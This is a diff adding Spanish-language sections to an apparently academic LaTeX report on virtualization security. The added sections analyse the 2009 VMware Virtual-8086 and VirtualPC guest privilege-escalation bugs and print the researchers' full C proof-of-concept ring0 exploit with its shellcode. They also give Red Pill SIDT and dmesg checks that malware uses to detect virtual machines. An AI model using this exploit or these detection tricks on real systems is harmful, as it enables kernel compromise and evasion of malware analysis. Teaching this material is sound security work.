@@ -146,3 +146,229 @@ int checkAdapterName(const char *pcszNameIn, char *pszNameOut)
 \end{verbatim}
 
 Se reemplazo la llamada peligrosa al popen por execve y se agregaron nuevos chequeos basicos sobre el argumento de entrada.
+
+
+\subsection{VMware Products Guest Privilege Escalation Vulnerability}
+
+En este caso, vamos a analizar una vulnerabilidad reportada por Tavis Ormandy y Julien Tinnes de Google Security Team que afecta a todos los productos de virtualizacion de VMware, incluidos aquellos que utilizacion virtualizacion por hardware. Fue publicada el 27 de Octubre del 2009 por VMware en conjunto con los investigadores y el parche salio el mismo dia.
+
+Al ser VMware una aplicacion propietaria y de codigo cerrado no fue divulgado el codigo vulnerable, pero si un analisis detallado de la vulnerabilidad.
+
+En modo protegido, cpl es igual a los dos bits menos significativos del registro cs. Sin embargo, en modo Virtual-8086 $($el cual es un modo para correr aplicaciones de modo real que son incapaces de correr en modo protegido, como aplicaciones de MS-DOS por ejemplo$)$ el cpl es siempre 3, que significa menor privilegio, sin importar el valor del registro cs.
+
+Cuando el procesador eleva una excepcio de page fault, un codigo de excepcion es introducido al stack conteniendo los flags usados por el sistema operativo para determinar el correcto curso de accion. Uno de esos flags es llamado U/S $($user/supervisor$)$, el cual es establecido si la falta ocurrio cuando el procesador estaba en modo usuario.
+
+En el modo Virtual-8086, cuando VMware emula una instruccion de llamada larga (far call) o salto largo (far jump), incorrectamente introduce a la pila el valor devuelto de cs e ip usando acceso de supervisor, causando un codigo de excepcion incorrecto que es enviado al sistema operativo huesped.
+
+Como el modo Virtual-8086 permite codigo de usuario para especificar el registro cs en un valor arbitrario, incluyendo los dos bits menos significativos, un atacante puede usar el acceso del supervisor para confundir al kerner y generar una elevacion de privilegios.
+
+La siguiente prueba de concepto fue liberada por los autores:
+
+\begin{verbatim}
+
+//
+// -----------------------------------
+//  VMWare Workstation Virtual 8086 Linux Local ring0
+// --------------------------- taviso@sdf.lonestar.org, julien@cr0.org -----
+//
+// Tavis Ormandy and Julien Tinnes, June 2009
+//
+//
+
+#ifndef _GNU_SOURCE
+# define _GNU_SOURCE
+#endif
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <string.h>
+#include <signal.h>
+#include <sys/mman.h>
+#include <sys/user.h>
+#include <sys/vm86.h>
+#include <asm/unistd.h>
+
+#include "vm86util.h"
+
+static bool InitialiseVirtual8086();
+static bool InstallShellCode();
+static bool EnterVirtual8086();
+static bool MapPageAtNull();
+
+int main(int argc, char **argv)
+{
+    // Get a page mapped at NULL
+    if (MapPageAtNull()) {
+        fprintf(stderr, "mmap() failed: %m\n");
+        return 1;
+    }
+
+    // Setup the Virtual 8086 address space
+    InitialiseVirtual8086();
+
+    // Install the shellcode that executes once we've gained control of the kernel
+    InstallShellCode();
+
+    // Trigger the VMWare Vulnerability
+    EnterVirtual8086();
+
+    // Not Reached
+    abort();
+}
+
+static bool MapPageAtNull()
+{
+   return mmap(NULL, PAGE_SIZE, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0) == MAP_FAILED;
+}
+
+static char Message[1024];
+static size_t MessageSize;
+
+static bool InstallShellCode()
+{
+    uint8_t *code;
+    uint32_t codesize;
+
+    // Message to print from ring0
+    MessageSize = snprintf(Message, sizeof(Message), "<script>alert('ring0')</script>\n");
+
+    CODE32("mov     esp, edi                        \n"     // Restore a usable stack
+           "sub     esp, 0x50                       \n"     // Fixup stack pointer
+
+           // Print message
+           "mov     edx, MessageSize                \n"     // len
+           "lea     ecx, Message                    \n"     // buf
+           "mov     ebx, " SYM(STDOUT_FILENO) "     \n"     // fd
+           "mov     eax, " SYM(__NR_write) "        \n"
+           "int     0x80                            \n"     // write(STDOUT_FILENO, Message, sizeof(Message));
+
+           // Now kill this process
+           "mov     eax, " SYM(__NR_getpid) "       \n"
+           "int     0x80                            \n"     // getpid()
+           "mov     ebx, eax                        \n"     // pid
+           "mov     ecx, " SYM(SIGKILL) "           \n"     // signal
+           "mov     eax, " SYM(__NR_kill) "         \n"
+           "int     0x80                            \n",    // kill(getpid(), SIGKILL);
+           code,
+           codesize);
+
+    // Install it to the pnp bios jmp location
+    memcpy(REAL(0x0000, 0x0000), code, codesize);
+
+    return true;
+}
+
+static bool EnterVirtual8086()
+{
+    uint8_t *code;
+    uint32_t codesize;
+    vm86_t vm = {0};
+
+    // Setup cpu type
+    vm.cpu_type = CPU_586;
+
+    // Setup registers
+    vm.regs.eflags = EFLAGS_TF_MASK;
+    vm.regs.esp = 0xDEADBEEF;
+    vm.regs.eip = 0x00000000;
+    vm.regs.cs = 0x0090;
+    vm.regs.ss = 0xFFFF;
+
+    CODE16("call 0xaabb:0xccdd", code, codesize);
+
+    memcpy(REAL(vm.regs.cs, vm.regs.eip), code, codesize);
+
+    vm86(Vm86Enter, &vm);
+
+    return false;
+}
+
+static bool InitialiseVirtual8086()
+{
+    // Make the MMAP_PAGE_ZERO page rwx
+    if (mprotect(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
+        return false;
+    }
+
+    // Stretch the page to 1MB for the entire real mode address space
+    if (mremap(NULL, PAGE_SIZE, 1024 * 1024, 0) == MAP_FAILED) {
+        return false;
+    }
+
+    // All done
+    return true;
+}
+
+\end{verbatim}
+
+En el exploit se ve como el atacante setea la memoria real como de escritura, ejecucion y lectura y la estira a 1MB (el limite). Luego, inserta el shellcode en el sector de PNP BIOS (que va a ser el causante del page fault). Este shellcode solo escribe en pantalla $<script>alert('ring0')</script>$, al ser este un exploit no-peligroso (ya que no causa real da'no a la victima, pero sirve para demostrar la vulnerabilidad).
+Luego hace la llamada a 0xaabb:0xccdd, que es memoria no mapeada y al volver esta en modo supervisor el kernel y ejecuta el shellcode del PNP Bios con los privilegios elevados.
+
+\subsection{VirtualPC instruction decoding Privilege Escalation}
+
+Esta vulnerabilidad tambien reportada por Ormandy y Tinnes de Google en el 2009 con CVE 1542 explota algo similar a la anterior mostrada.
+
+En este caso el problema radica en que ciertas instrucciones ejecutadas desde el guest son mal desencodeadas e interpretadas por el VMM, lo que causa que sean ejecutadas con permisos de supervisor.
+
+Una de estas instrucciones es clts, la cual limpia el valor previo en el flag de task-switch en ring 0. Este flag se examina cada vez q se quiere ejecutar una instruccion de FPU. Si cada vez que el atacante quiere ejecutar codigo de FPU (FPU/MMX/SSE/SSE2/SSE3/SSSE3/SSE4), setea esta instruccion con el bug anterior que falla en la desencodeo, siempre va a poder ejecutar dichas instrucciones en modo supervisor.
+
+Microsoft arreglo este bug el 15 de julio del 2009 y publicando escasa informacion del mismo en conjunto con los descubridores del error.
+
+\section{Detecci'on de entorno virtualizado}
+
+En la siguiente seccion vamos a enumerar 2 de las principales formas de detectar si se esta corriendo en un entorno virtualizado. Esto es necesario en ciertos casos en los que se quiere que no se analice cierto software, como virus o malware, y se comportan de manera diferente al detectar virtualizacion. Principalmente se basan en errores u omisiones de emulacion de ciertas instrucciones no documentadas de los procesadores o tambien de algunas respuestas a instrucciones que son diferentes en entornos virtualizados, lo que da una idea cierta de esto.
+Al estar estas soluciones basadas en fallas u omisiones, no siempre son 100$\%$ confiables. Hasta el momento no hay manera de saber si uno esta virtualizado sin depender de esto o de software instalado en el huesped (como vmware tools). Esto en parte se debe a que al ser la virtualizacion un metodo para aislar y dar la impresion de una maquina fisica, se trata de evitar justamente la deteccion.
+
+\subsection{Red Pill - Joanna Rutkowska}
+
+Quizas la manera mas difundida de deteccion por la facilidad y el poco codigo utilizado. Esta herramienta se aprovecha de la instruccion SIDT que guarda el contenido de la tabla de descripcion de interrumpciones (IDTR) en el operando de destino, que es realmente un lugar en la memoria. Se utiliza ya que esta instruccion puede ser ejecutada en un modo sin privilegios (ring 3), y al retornar lo hace con informacion sensible de dicha tabla, usada internamente por el sistema operativo.
+
+Como solamente hay un solo registro IDTR, pero hay por lo menos dos sistemas operativos corriendo simultameneamente (el huesped y el anfitrion), el hypervisor necesita realocar el IDTR del huesped en un lugar seguro, para que no entre en conflictos con el mismo del anfitrion. El hypervisor no sabe si el huesped ejecuta la instruccion SIDT (ni cuando), ya que puede ser ejecutada desde el ring 3, entonces el proceso obtiene el lugar de la tabla de interrupciones movida. Por ejemplo en VMware, esta direccion es de la forma 0xffXXXXXX, en VirtualPC es 0xe8XXXXXX.
+
+De esta manera se puede detectar el entorno virtualizado mediante la respuesta de una instruccion ejecutada con los privilegios minimos.
+
+El codigo de la Red Pill es el siguiente:
+
+\begin{verbatim}
+
+  int swallow_redpill () {
+       unsigned char m[2+4], rpill[] = "\x0f\x01\x0d\x00\x00\x00\x00\xc3";
+       *((unsigned*)&rpill[3]) = (unsigned)m;
+       ((void(*)())&rpill)();
+       return (m[5]>0xd0) ? 1 : 0;
+     }
+
+\end{verbatim}	
+
+\subsection{Analisis de outputs de comandos en *nix}
+
+Otra forma de verificar el entorno virtualizado es mediante la ejecucion del programa dmesg. En una plataforma recien encendida basta con $dmesg | grep -i virtual$, en cambio en una que ya tenga cierto tiempo corriendo es mas efectivo ejecutar $/var/log/dmesg | grep -i virtual$.
+
+Aca esta un ejemplo para los diferentes softwares de virtualizacion:
+
+\begin{verbatim}
+
+ VMWare:
+
+ # dmesg | grep -i virtual
+ VMware vmxnet virtual NIC driver
+   Vendor: VMware    Model: Virtual disk      Rev: 1.0 
+ hda: VMware Virtual IDE CDROM Drive, ATAPI CD/DVD-ROM drive
+ 
+ QEmu or KVM:
+
+ # dmesg | grep -i virtual
+ CPU: AMD QEMU Virtual CPU version 0.9.1 stepping 03
+
+ Microsoft VirtualPC:
+
+ # dmesg | grep -i virtual
+ hda: Virtual HD, ATA DISK drive
+ hdc: Virtual CD, ATAPI CD/DVD-ROM drive
+ 
+\end{verbatim}
+
+Otros comandos similares para verificar son dmidecode y cat /proc/ide/hd*/model.
+
